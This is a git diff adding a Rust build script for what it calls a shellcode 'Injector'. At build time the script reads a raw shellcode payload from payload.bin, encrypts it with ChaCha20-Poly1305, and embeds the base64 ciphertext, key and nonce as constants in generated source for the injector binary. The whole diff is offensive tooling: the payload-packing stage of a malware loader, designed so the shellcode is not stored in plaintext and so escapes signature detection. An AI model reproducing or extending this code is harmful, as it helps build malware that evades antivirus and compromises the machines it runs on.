diff --git a/inject/build.rs b/inject/build.rs
new file mode 100644
index 0000000..7ffab94
--- /dev/null
+++ b/inject/build.rs
@@ -0,0 +1,65 @@
+use chacha20poly1305::{
+    aead::{Aead, KeyInit}, 
+    ChaCha20Poly1305, Key, Nonce, 
+};
+use rand::RngCore; 
+use rand::rngs::OsRng; 
+use std::env; 
+use std::fs; 
+use std::io::Write; 
+use std::path::Path; 
+
+use base64::engine::Engine as _; 
+use base64::engine::general_purpose::STANDARD; 
+
+fn main() {
+    println!("cargo:warning=--- Injector BUILD.RS STARTED ---"); 
+    
+    let payload_path = Path::new("payload.bin"); 
+    
+    // Create dummy payload if it doesn't exist to allow compilation
+    if !payload_path.exists() {
+        println!("cargo:warning=payload.bin not found, creating dummy.");
+        fs::write(payload_path, b"\x90\x90\x90\x90").unwrap(); // NOPs
+    }
+    
+    println!("cargo:rerun-if-changed={}", payload_path.display()); 
+
+    let shellcode = fs::read(payload_path)
+        .expect("Error: payload.bin could not be read.");
+        
+    println!("cargo:warning=Shellcode read successfully, size: {} bytes", shellcode.len()); 
+    
+    let mut rng = OsRng::default();
+
+    let mut key_bytes = [0u8; 32];
+    RngCore::fill_bytes(&mut rng, &mut key_bytes); 
+    let key = Key::from_slice(&key_bytes); 
+
+    let mut nonce_bytes = [0u8; 12];
+    RngCore::fill_bytes(&mut rng, &mut nonce_bytes); 
+    let nonce = Nonce::from_slice(&nonce_bytes);
+
+    let cipher = ChaCha20Poly1305::new(key); 
+    let ciphertext_vec = cipher 
+        .encrypt(nonce, shellcode.as_ref())
+        .expect("Payload encryption failed!");
+
+    let ciphertext_base64 = STANDARD.encode(ciphertext_vec); 
+    
+    let out_dir = env::var("OUT_DIR").unwrap();
+    let dest_path = Path::new(&out_dir).join("payload_data.rs"); 
+
+    let mut file = fs::File::create(&dest_path).expect("Could not create payload_data.rs file");
+    
+    writeln!(
+        file,
+        "pub const ENCRYPTED_PAYLOAD_BASE64: &str = \"{}\";", 
+        ciphertext_base64
+    ).unwrap(); 
+    writeln!(file, "pub const PAYLOAD_KEY: [u8; 32] = {:?};", key_bytes).unwrap();
+    writeln!(file, "pub const PAYLOAD_NONCE: [u8; 12] = {:?};", nonce_bytes).unwrap();
+    
+    println!("cargo:warning=--- Injector: Shellcode successfully encrypted in {}", dest_path.display());
+    println!("cargo:warning=--- Injector BUILD.RS FINISHED ---");
+}
